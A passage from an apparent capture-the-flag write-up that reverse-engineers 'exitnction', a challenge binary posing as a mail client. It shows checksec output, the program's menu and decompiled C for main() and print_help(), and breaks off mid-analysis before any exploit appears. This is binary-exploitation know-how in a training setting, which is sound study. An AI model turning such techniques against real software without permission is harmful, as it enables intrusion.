<div class="expressive-code"><link rel="stylesheet" href="/_astro/ec.jdn72.css"/><script type="module" src="/_astro/ec.8zarh.js"></script><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:55ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">tar</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">xzvf</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">exitnction.tar.gz</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">exitnction/</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">exitnction/Dockerfile</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">exitnction/docker-compose.yml</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">exitnction/flag.txt</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">exitnction/exitnction</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">cd</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">exitnction</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">file</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./exitnction</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">tr</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;,&#39;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;\n&#39;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">./exitnction:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ELF</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">64-bit</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">LSB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pie</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">executable</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">x86-64</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">version</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> (SYSV)</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">dynamically</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">linked</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">interpreter</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/lib64/ld-linux-x86-64.so.2</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8"> </span></span><span style="--0:#24292E;--1:#E1E4E8">BuildID[sha1]</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#032F62;--1:#9ECBFF">f531e50a36ad71168e198a5682ddd066791db04b</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> GNU/Linux </span><span style="--0:#005CC5;--1:#79B8FF">3.2.0</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">not</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">stripped</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pwn</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">checksec</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./exitnction</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#032F62;--1:#9ECBFF">&#39;/home/kali/exitnction/exitnction&#39;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Arch:</span><span style="--0:#24292E;--1:#E1E4E8">       </span><span style="--0:#032F62;--1:#9ECBFF">amd64-64-little</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">RELRO:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Full</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">RELRO</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stack:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Canary</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">found</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">NX:</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">NX</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">PIE:</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">PIE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">FORTIFY:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">Enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">SHSTK:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">IBT:</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">Enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stripped:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">No</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ tar xzvf exitnction.tar.gzexitnction/exitnction/Dockerfileexitnction/docker-compose.ymlexitnction/flag.txtexitnction/exitnction$ cd exitnction$ file ./exitnction | tr ',' '\n'./exitnction: ELF 64-bit LSB pie executable x86-64 version 1 (SYSV) dynamically linked interpreter /lib64/ld-linux-x86-64.so.2 BuildID[sha1]=f531e50a36ad71168e198a5682ddd066791db04b for GNU/Linux 3.2.0 not stripped$ pwn checksec ./exitnction[*] '/home/kali/exitnction/exitnction'    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    FORTIFY:    Enabled    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No"><div></div></button></div></figure></div>
<p>Running the binary we are presented by a simple menu:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:47ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./exitnction</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Welcome</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">the</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;Exitnction&#39;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">client!</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Exitnction</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Client</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Commands:</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">read</span><span style="--0:#24292E;--1:#E1E4E8">          </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Read</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">emails</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">write</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Write</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">an</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">e-mail</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">server</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Print</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">server</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">information</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">help</span><span style="--0:#24292E;--1:#E1E4E8">          </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Show</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">this</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">help</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">message</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">exit</span><span style="--0:#24292E;--1:#E1E4E8">          </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Exit</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> ^C</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ./exitnctionWelcome to the 'Exitnction' mail client!Exitnction Mail Client Commands:  read          - Read emails  write         - Write an e-mail  server        - Print mail server information  help          - Show this help message  exit          - Exit> ^C"><div></div></button></div></figure></div>
<h2 id="dissecting-the-program">Dissecting the Program</h2>
<p>According to the menu, the program allows us to <strong>read or write emails</strong>, <strong>view server information</strong>, <strong>print the help message</strong>, or <strong>exit</strong>.</p>
<p>The <code>main()</code> function declares a few variables:</p>
<p><img src="https://github.com/user-attachments/assets/a817bd07-22e1-4183-a0ee-aa3bcc51bd6d" alt/></p>
<p>Then allocates a chunk to store the default license information and copies the first license from a a bunch of different licenses you can have from this global variable <code>licenses</code>.</p>
<p><img src="https://github.com/user-attachments/assets/51f1808e-2e54-4259-a7c0-ae4b0f0dc33e" alt/></p>
<p><code>licenses</code> is a array of pointers stored in <code>.data</code> section:</p>
<p><img src="https://github.com/user-attachments/assets/2954bd4d-c68d-4573-a0ee-ecea13f5f33b" alt/></p>
<p>Now, that we have that out of the way let’s analyze the menu do-while loop:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:55ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">undefined8 </span><span style="--0:#6F42C1;--1:#B392F0">main</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Welcome to the </span><span style="--0:#005CC5;--1:#79B8FF">\&#39;</span><span style="--0:#032F62;--1:#9ECBFF">Exitnction</span><span style="--0:#005CC5;--1:#79B8FF">\&#39;</span><span style="--0:#032F62;--1:#9ECBFF"> mail client!</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">print_help</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">menu_loop:</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">do</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">bytesRead </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">__isoc23_scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%9s</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">choice);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (bytesRead </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exit:</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">free</span><span style="--0:#24292E;--1:#E1E4E8">(current_license);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (canary </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">long</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">)(in_FS_OFFSET </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">28</span><span style="--0:#24292E;--1:#E1E4E8">)) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">__stack_chk_fail</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">} </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8">( </span><span style="--0:#005CC5;--1:#79B8FF">true</span><span style="--0:#24292E;--1:#E1E4E8"> );</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="undefined8 main(void){...SNIP...  puts(&#34;Welcome to the \'Exitnction\' mail client!\n&#34;);  print_help();menu_loop:  do {    __printf_chk(2,&#34;\n> &#34;);    bytesRead = __isoc23_scanf(&#34;%9s&#34;,&#38;choice);    if (bytesRead != 1) {exit:      free(current_license);      if (canary == *(long *)(in_FS_OFFSET + 0x28)) {        return 0;      }      __stack_chk_fail();    }...SNIP...  } while( true );}"><div></div></button></div></figure></div>
<p><code>print_help()</code> function just prints the menu that we saw in the beginning:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:58ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">print_help</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Exitnction Mail Client Commands:&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;  read          - Read emails&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;  write         - Write an e-mail&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;  server        - Print mail server information&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;  help          - Show this help message&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;  exit          - Exit&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="void print_help(void){  puts(&#34;Exitnction Mail Client Commands:&#34;);  puts(&#34;  read          - Read emails&#34;);  puts(&#34;  write         - Write an e-mail&#34;);  puts(&#34;  server        - Print mail server information&#34;);  puts(&#34;  help          - Show this help message&#34;);  puts(&#34;  exit          - Exit&#34;);  puts(&#34;&#34;);  return;}"><div></div></button></div></figure></div>
<p>After printing the help message the program enters a <code>do-while</code> loop where it asks for option and then performs accordingly.</p>
<p>The program uses integer comparisons against string hashes rather than <code>strcmp()</code>. For clarity, I’ll represent these as their string equivalents:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:54ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">// Simplified from: if ((choice == 0x74697277) &amp;&amp; ...)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (choice </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;write&quot;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">write_email</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="// Simplified from: if ((choice == 0x74697277) &#38;&#38; ...)if (choice == &#34;write&#34;) {...SNIP...    write_email();}"><div></div></button></div></figure></div>
<p>Here is the logic behind the <code>do-while</code> menu:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:96ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (choice </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;read&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (choice </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;write&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> sent_mails) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div 